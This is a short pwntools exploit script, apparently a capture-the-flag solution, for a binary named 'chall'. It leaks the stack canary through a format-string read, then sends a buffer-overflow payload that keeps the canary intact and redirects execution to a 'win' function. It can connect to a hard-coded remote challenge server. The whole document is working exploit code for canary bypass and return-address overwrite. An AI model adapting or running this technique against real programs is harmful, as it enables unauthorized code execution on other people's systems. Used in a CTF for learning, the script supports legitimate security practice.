from pwn import *

gs = '''
b *main+135
continue
'''

elf = ELF("./chall")

def start():
    if args.REMOTE:
        return remote("83.136.252.167", 40382)
        #return remote("127.0.0.1", 1027)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

context.terminal = ['gnome-terminal', '-e']

io = start()

"""
for i in range(0,100):

    io.sendlineafter(": ", f"%{i}$lX".encode())

    print(f"{i} : {io.recvline().strip().decode()}")
"""
io.sendlineafter(": ", "%9$lX".encode())
canary = int(io.recvline().strip().decode(), 16)

print(f"Canary: {hex(canary)}")

ret = 0x000000000040101a

payload = b"".join([
    b'A'*24,
    p64(canary),
    b"B"*8,
    p64(ret),
    p64(elf.symbols.win),
])

io.sendlineafter(": ", payload)
io.sendlineafter(": ", b"YES")
io.interactive()

